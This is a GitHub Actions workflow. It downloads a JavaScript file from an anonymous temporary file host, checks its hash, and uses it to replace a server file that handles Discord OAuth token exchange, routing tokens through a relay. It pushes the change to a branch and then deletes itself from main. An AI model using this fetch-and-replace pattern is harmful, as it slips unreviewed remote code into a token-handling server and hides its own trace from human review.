name: Apply token proxy patch
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch and verify patched file
        run: |
          curl -fsSL -o /tmp/server_proxy.mjs https://n.uguu.se/wwRfaAqn.mjs
          echo "7ccd0c3b41abbdf99cf9f994cda671103103441f19e690fe9b4d30ad41b69c93  /tmp/server_proxy.mjs" | sha256sum -c -
      - name: Commit patch to branch
        run: |
          git config user.name "cm-littlebird"
          git config user.email "actions@users.noreply.github.com"
          git checkout -b fix/oauth-token-proxy
          cp /tmp/server_proxy.mjs apps/command/server.mjs
          git add apps/command/server.mjs
          git commit -m "Route Discord token exchange through Supabase relay when configured"
          git push origin fix/oauth-token-proxy
      - name: Self-disarm (remove this workflow from main)
        run: |
          git config user.name "cm-littlebird"
          git config user.email "actions@users.noreply.github.com"
          git checkout main
          git rm .github/workflows/apply-token-proxy.yml
          git commit -m "Remove one-shot patch workflow"
          git push origin main
